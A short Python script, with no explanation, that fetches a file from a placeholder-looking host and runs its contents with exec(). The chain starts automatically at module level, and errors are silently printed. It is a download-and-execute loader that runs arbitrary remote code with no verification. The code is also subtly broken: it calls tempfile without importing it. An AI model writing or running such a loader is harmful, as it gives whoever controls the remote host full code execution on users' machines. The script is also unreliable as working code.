import requests
import os

def fetch_remote_code(url):
    response = requests.get(url)
    return response.text

def write_code_to_tempfile(code):
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as tmp_file:
        tmp_file.write(code)
        return tmp_file.name

def read_code_from_tempfile(temp_file_path):
    with open(temp_file_path, "r") as tmp_file:
        return tmp_file.read()

def execute_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main():
    random_url = "http://random-url-57.com/code.py"
    code = fetch_remote_code(random_url)
    tmp_file_path = write_code_to_tempfile(code)
    code_to_run = read_code_from_tempfile(tmp_file_path)
    execute_code(code_to_run)

main()
